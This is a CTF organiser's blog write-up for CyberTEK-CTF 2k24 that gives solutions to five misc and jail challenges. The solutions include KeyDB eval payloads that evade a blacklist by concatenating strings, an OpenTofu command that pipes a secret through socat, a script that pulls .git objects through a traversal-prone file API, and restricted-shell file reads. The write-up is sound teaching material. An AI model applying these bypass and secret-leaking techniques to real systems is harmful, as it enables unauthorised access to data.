---
title: "CyberTEK-CTF 2k24"
date: 2024-05-05
draft: false
description: "a description"
tags: ["ctf", "misc"]
aliases: ["/writeups/CyberTEK-CTF-2k24/"]
---

### Intro;
Last weekend, we had the privilege of organizing a local CTF competition at TEKUP University. The competition featured +30 custom-authored challenges spanning diverse categories. 
The event saw an amazing turnout with 50+ teams and 140+ players joining in. The feedback was incredibly positive, with many participants enjoying the challenges and the overall experience.


### About;
  - Event place: TEKUP University. 
  - Event duration: `14hrs`.
  - Flag format: Securinets{.*}.

### Challenges;
The CTF showcased a wide variety of challenges across multiple categories, and I had the privilege to author 6 challenges for the Misc category although most of them are jail-oriented tasks. Below is a detailed breakdown of the challenges and their difficulty levels:

|   Challenge     | Points | Solves |  Author |
|-----------------|--------|--------|---------|
|   [Siclodb]()       |  500   |   1    | chxmxii |
|   [Openheimer]()    |  440   |   6    | chxmxii |
|   [bolbok]()        |  470   |   4    | chxmxii |
|   [ekko]()          |  494   |   7    | chxmxii |
|   [heimerdigger]()  |  146   |   18   | xhlayel, chxmxii |

#### Siclodb;
This challenge was a bit tricky. I blacklisted several KeyDB functions to prevent players from directly retrieving the value of the flag key. The twist was that many participants were unaware they could use eval() in the KeyDB console or leverage redis.call() as an alternative to KeyDB.call() (since keydb is a fork of redis) to bypass the restrictions. However the final payload should look like that;
```shell
$ eval "local a='du'; a=a..'mp';local b='fl';b=b..'ag'; local k=redis.call(a, b); return k;" 0
$ eval "local a='ge'; a=a..'t';local b='fl';b=b..'ag'; return cjson.encode(redis.call(a, b))" 0
```
---
#### Openheimer;
In case you're unfamiliar, OpenTofu is a community-driven fork of the popular Infrastructure-as-Code tool Terraform, created after some licensing changes caused controversy. To introduce OpenTofu to the community, I designed this challenge, which allows players to connect to an OpenTofu console.

The objective is for players to figure out how to list the OpenTofu secrets. There are several ways to solve this, and one possible solution is shown below:

```shell
nonsensitive(urlencode(var.SECRET)) | socat - TCP:localhost:13337
```
For more; 
{{< alert "link" >}}
https://opentofu.org/docs/language/functions/nonsensitive/
{{< /alert >}}

---
#### Ekko;
The challenge present two API endpoints, one for listing directories and another for reading file contents. This inspired the challenge's description, ls && cat made easy. Without diving too deep into the specifics, you can find the solution for this challenge below:
```python
from os import listdir, path
import requests, re, zlib\

url = "https://ekko.securinets-tekup.tech/"
commit_list = []
request = requests.get(url + "ls?q=...git/objects")
objects = re.findall("\w+", request.text)

if request.status_code == 200:
    for obj in objects:
        get_commit = requests.get(url + "ls?q=...git/objects/" + obj + "/")
        commits = re.findall("\w+", get_commit.text)
        for commit in commits:
            get_blob = requests.get(url + "cat?q=...git/objects/" + obj + "/" + commit)
            with open(commit + ".zlib", "wb") as f:
                f.write(get_blob.content)

for blob in listdir("."):
    with open(blob, "rb") as f:
        blob_content = f.read()
    f.close()
    try:
        decompressed_blob = zlib.decompress(blob_content)
    except zlib.error as e:
        print(f"Zlib error: {e}")
    flag = re.search("Securinets.*", str(decompressed_blob))
    if flag:
        print(flag.group())
```

---
#### Bolbok
In this challenge, players were placed in a restricted shell environment, `rbash`, with limited command options. The flag was hidden in a directory with an ambiguous name, making it tricky to locate. However, for those familiar with `ls` and `grep`, the solution was straightforward:

```shell
ls -Ra / | grep flag -B3
<path>:
.
..
.flag
```
Players had to figure out how to read its contents within the restricted shell.
```shell
echo $(< <path>/.flag)
Securinets{FLAG}
OR
while read line; do echo $line; done < <path>/.flag
Securinets{FLAG}
``` 

---
#### Heimerdigger;
dive into the docker layers and collect the deleted files.
one of the files gave us a hint about fixing the corrupted jpg file `f(byte) = (15 - byte) modulos 256`

```python
def transform_file(input_image_path, output_image_path):
    with open(input_image_path, 'rb') as input_file:
        data = input_file.read()
    modified_data = bytearray((15 - byte) % 256 for byte in data)
    with open(output_image_path, 'wb') as output_file:
        output_file.write(modified_data)
        print("Modified image saved to:", output_image_path)

# Usage
input_image_path = "./01946.jpg"
output_image_path = "./heimer.jpg"
transform_file(input_image_path, output_image_path)
``` 
---
### Das Ende;

A huge shoutout to everyone who helped make this event a success-Securitnets TEKUP, the participants, and the support from TEKUP University.
For more insights, detailed write-ups, or to access the challenge files, check out my GitHub repository: 

{{< github repo="chxmxii/CTF" >}}